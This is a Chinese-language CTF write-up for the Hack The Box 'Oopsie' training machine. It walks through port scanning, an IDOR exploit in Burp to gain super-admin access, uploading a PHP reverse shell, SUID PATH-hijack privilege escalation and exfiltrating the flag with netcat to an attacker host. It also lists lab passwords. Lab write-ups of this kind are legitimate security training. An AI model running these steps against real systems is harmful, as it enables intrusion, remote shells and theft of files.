# Oopsie 
###### tags: `HTB_Starting Point`
1. 在進行枚舉(Enumeration)前，可以Ping目標IP來檢查VPN連接是否正常，以及該計算機是否處於活動狀態。 (有時，目標機器可能會禁用ping，使其無法通過防火牆。 但是在大多數情況下，ping會成功！)
```
ping -c  2 10.10.10.28
```
![](https://i.imgur.com/Z8Bz0Jm.png)

* 由上圖可知ping的結果是TTL = 63。 由於透過VPN的方式，目標主機與我們之間只有一條路線，因此可以推測目標主機為Linux 機器。

2.  Enumeration(枚舉)

* Fast ports scan(快速的端口掃描)
```
nmap -n -vv --open -T4 -p- -oN AllPorts.nmap 10.10.10.28
```
-n  : Never do DNS resolution
-vv	: Extra verbosity
--open	: Output only open ports
-p-	: Full TCP ports range (65535)
-T4	: Aggressive (4) speeds scans; assumes you are on a reasonably fast and reliable network
![](https://i.imgur.com/du9OjPd.png)
* Run Nmap Scripting Engine
為了得到最佳結果，可以針對有開放的端口運行Nmap腳本引擎。
```
nmap -sV -sC -oN Oopsie_detail.nmap -p 22,80 10.10.10.28
```
![](https://i.imgur.com/2eq192Q.png)

由上圖可以得知，OS是Ubuntu，並且具有開放的端口22（SSH）和80（HTTP）。 先測試80 port。
* Discover more on port 80 

打開Burp Suite和Web瀏覽器。輸入http://10.10.10.28/

* 設定Burp Suite為Firefox的代理Proxy
```
ToolBox -> Preferences -> Network Setting -> Settings
```
![](https://i.imgur.com/z4xSOYY.png)

* 確認Burp Suite Proxy Listeners有開啟(藍色勾勾)
```
Proxy -> Options -> Proxy Listeners
``` 
![](https://i.imgur.com/Sh2UILk.png)

首先是第一件事，可以發現有一個登入有關的URL，很不幸的是，它只是空白頁。嗯，在嘗試一下http://10.10.10.28/cdn-cgi/login 可以得到一個登入介面。
![](https://i.imgur.com/PuaiDNR.png)

* admin : admin
* admin : default
* admin : password

都沒有效，嘗試一下上一台靶機Archetype上的密碼
賓果!
* admin : MEGACORP_4dm1n!!

登入成功後，會進到DashBorad的介面

![](https://i.imgur.com/Jmcfp39.png)

其中Uploads是讓人較感興趣的功能，如果能夠成功上傳PHP Web Shell，就是一個不錯的方法
![](https://i.imgur.com/QWs09EY.png)

但似乎沒那麼簡單，上傳檔案需要super admin的權限，我們檢視一下Burp

![](https://i.imgur.com/zfMxoq6.png)

似乎可以利用[IDOR](https://portswigger.net/web-security/access-control/idor)的漏洞!!!

3. 準備在Burp上利用IDOR漏洞
```
Intruder -> Target -> Set Attack Target
```
![](https://i.imgur.com/ywnNWnn.png)
```
Inturder -> Positions -> Payload Positions -> Attack type ->Sniper
```
![](https://i.imgur.com/3ew2vfv.png)

* 系統會預設幫你自動選擇可以嘗試置換的參數位置，這裡我們先點選clear，清除預設值，再針對ID點選Add選項(如上圖)

```
Inturder -> Payloads -> Payload Sets
```
![](https://i.imgur.com/D3eJXDc.png)
```
choose Start attack (The right side of panel)
```
* 等掃描完成後，直覺上是以Length長度非3787的結果一一點開查看

![](https://i.imgur.com/ybhqr4J.png)

賓果!
* superadmin id :86575

4. Foothold(立足點)
* 回到uploads的介面，並將Burp Intercepts功能開啟
```
Proxy -> Intercept -> Intercept on
```
![](https://i.imgur.com/qtCjjY0.png)

* 更改 user 以及role

![](https://i.imgur.com/RtQP3Zz.png)

* 點選Forward之後，就可以成功進到Uploads介面
![](https://i.imgur.com/DewLZDy.png)

* 首先將PHP Reverse Shell複製到當前目錄，修改一下檔案內容
```
cp /usr/share/webshells/php/php-reverse-shell.php .
vim php-reverse-shell.php
```
![](https://i.imgur.com/55CKacD.png)

* 輸入自己的主機IP以及Port 4444

![](https://i.imgur.com/XVHSE2n.png)

* 重新命名一下檔案名稱為shell.php，並Uploads該檔案
```
mv php-reverse-shell.php shell.php
```
![](https://i.imgur.com/4PxVmx3.png)

* 上傳成功(需要重複前面所提的Burp Intercepts步驟，修改參數為superadmin & ID後Forward)

![](https://i.imgur.com/b1kp6hp.png)

* 我們需要知道檔案上傳後，會被儲存在哪裡，因此使用[dirsearch](https://github.com/maurosoria/dirsearch) tool!

* 由於Kali預設沒有dirsearch工具，需要從Github上面clone下來並且安裝，這邊簡單的帶過安裝過程：

為了安裝上方便，我們先切換為root
```
su root
```
打算將檔案載到opt目錄，所以先切換一下

```
cd /opt

ls
```
從Git上面clone下來
```
git clone https://github.com/maurosoria/dirsearch.git
```
切換到dirsearch目錄下
```
cd dirsearch
```
需要使用pip3自動配置環境，因此需要安裝pip3，並檢查版本，最後執行自動配置
```
apt install python3-pip -y
pip3 --version
pip3 install -r requirements.txt
```
執行dirsearch
```
python3  dirsearch.py -u http://10.10.10.28/ -w /usr/share/SecLists/Discovery/Web-Content/raft-large-directories.txt
```
![](https://i.imgur.com/zj35jpl.png)

這時我們會發現kali上也沒有該字典檔，所以就到github上面clone下來吧!
```
git clone https://github.com/danielmiessler/SecLists.git
```
再執行一次dirsearch
```
python3  dirsearch.py -u http://10.10.10.28/ -w /usr/share/SecLists/Discovery/Web-Content/raft-large-directories.txt
```
![](https://i.imgur.com/6Wltpam.png)

我們可以得知上傳的檔案可能儲存於https://10.10.10.28/uploads 目錄底下
* 開啟Netcat來監聽
```
nc -lvnp 4444
```
![](https://i.imgur.com/GAiG5ay.png)

* 使用curl來fetch上傳的文件
```
curl http://10.10.10.28/uploads/shell.php
```
![](https://i.imgur.com/RoilptS.png)

* 用python模擬出一個Terminal，成功取得立足點
```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```
![](https://i.imgur.com/KHhGDsp.png)

5. 獲得一般使用者帳戶

* 在login目錄底下發現db.php文件中帶有使用者帳號密碼
```
cd /var/www/html/cdn-cgi/login
cat db.php
```
![](https://i.imgur.com/eAXGpqr.png)
* 嘗試看看帳號是否可用
```
su robert
```
![](https://i.imgur.com/Lb0EXHF.png)

* robert:M3g4C0rpUs3r!

* Get Flag
```
cd ~
cat user.txt
```
![](https://i.imgur.com/TjEnlXp.png)

6. Privilege Escalation(提權)

* 目前使用的帳號為robert我們可以使用id命令來驗證我們現在位於哪個用戶組中
```
id
```
![](https://i.imgur.com/msvhO3d.png)
* 從上圖可知robert是Bugtrack group裡的成員。檢查一下Bugtrack group可以訪問哪些文件。
```
find / -type f -group bugtracker 2> /dev/null
```

* / -type f :在根目錄下(/)，尋找一般檔案(-type f)
* 使用 -group 參數可以指定檔案的群組，例如在 / 之下搜尋所有 bugtracker 群組的檔案：
* 2> /dev/null :將過濾掉錯誤，只輸出成功結果

![](https://i.imgur.com/utmJnuq.png)

* 查看該目錄，我們可以發現一個bugtracker的二進製文件，並具有[SUID](https://dywang.csie.cyut.edu.tw/dywang/linuxSystem/node34.html)權限。(可以執行[SUID提權](https://www.anquanke.com/post/id/86979)攻擊)
```
ls -l /usr/bin/bugtracker
```
![](https://i.imgur.com/xsDj1dF.png)

* 嘗試執行該檔案
```
./usr/bin/bugtracker
```
![](https://i.imgur.com/JWtNREw.png)

* 沒有東西。我們使用strings指令，分析二進製文件中是否有任何硬編碼信息。
```
strings /usr/bin/bugtracker
```
![](https://i.imgur.com/0h1jOs0.png)

* cat指令是常用來做的SUID提權攻擊
* 切換到tmp目錄底下
```
cd /tmp/
```
* 創建etc文件
```
echo '/bin/sh' > cat
```
* 將etc文件轉為可執行檔
```
chmod +x cat
```
* 然後將當前工作目錄添加到PATH。
```
export PATH=/tmp:$PATH
```
* 再次運行/usr/bin/bugtracker二進製文件。選擇ID 1(cat /root/report ID為1)，提權成功!
```
 /usr/bin/bugtracker
```
![](https://i.imgur.com/1wYKUK7.png)

7. Get root flag

* 在本地端主機開啟netcat接收檔案
```
nc -l -p 7878 > root.txt
```
![](https://i.imgur.com/CasDVBK.png)

* 在目標主機上開啟netcat傳輸帶有flag的檔案
```
nc -w 3 yourip 7878 < root.txt
```
![](https://i.imgur.com/cUO36XF.png)

* Get the admin flag
```
cat root.txt
```
![](https://i.imgur.com/yXWsHlS.png)

8. 拓展
 在root的文件夾中，我們看到一個.config文件夾，其中包含一個FileZilla配置文件
* ftpuser : mc@F1l3ZilL4